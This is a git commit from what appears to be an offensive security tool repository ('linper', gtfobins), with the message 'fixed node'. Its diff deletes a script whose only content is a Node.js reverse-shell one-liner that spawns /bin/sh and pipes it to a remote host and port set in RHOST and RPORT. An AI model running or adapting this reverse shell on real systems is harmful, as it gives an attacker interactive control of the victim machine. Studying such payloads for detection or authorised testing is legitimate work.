8b52727397c117aec48f94aa47dc8b339698bd35
montysecurity <18372298+montysecurity@users.noreply.github.com>
2021-02-02 05:36:08 -0600

    fixed node

--- gtfobins/node.sh
+++
@@ -1,7 +0,0 @@
-linper=yes
-
-#!/bin/bash
-
-export RHOST=0.0.0.0
-export RPORT=5253
-node -e "sh = require(\"child_process\").spawn(\"/bin/sh\");net.connect('$RPORT', '$RHOST', function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});"
